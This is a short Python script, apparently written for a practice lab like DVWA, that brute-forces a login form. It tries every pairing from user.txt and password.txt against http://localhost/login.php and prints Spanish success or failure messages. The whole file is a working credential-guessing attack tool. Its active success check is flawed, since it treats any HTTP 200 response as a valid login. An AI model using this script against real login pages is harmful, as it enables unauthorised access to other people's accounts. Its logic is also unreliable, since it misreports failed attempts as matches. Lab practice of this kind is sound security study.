# Autor:
import sys
import requests
from termcolor import colored, cprint

# cookie = {"PHPSESSID": "qk9e71ier8vi62jumounl7jidf",
#           "security": "low"}

cookie = {}

def file_read(file):
    with open(file, mode='r', encoding='utf-8') as file_text:
        return file_text.read()


user = file_read("user.txt").split("\n")
password = file_read("password.txt").split("\n")

'''
for i in user:
    for j in password:
        url = f"http://localhost?username={i}&password={j}"
        response = requests.get(url, cookies=cookie)

        if not "Username and/or password incorrect." in response.text:
            cprint(f"[+] {i}:{j} es valido", "green", attrs=["bold"], file=sys.stderr)
        else:
            cprint(f"[-] {i}:{j} no es valido", "red", attrs=["bold"], file=sys.stderr)
'''

for i in range(len(user)):
    for j in range(len(password)):
        url = f"http://localhost/login.php?username={user[i]}&password={password[j]}"
        response = requests.get(url, cookies=cookie)

        print(f"{user[i]} ==> {password[j]}")
        print(response.text)

        if response.status_code != 200:
            print(colored(f'INVALID_CREDENTIAL: {user[i]} ==> {password[j]}', "red"))
        else:
            print(colored(f'Coincidencia encontrada: {user[i]} ==> {password[j]}', "green"))
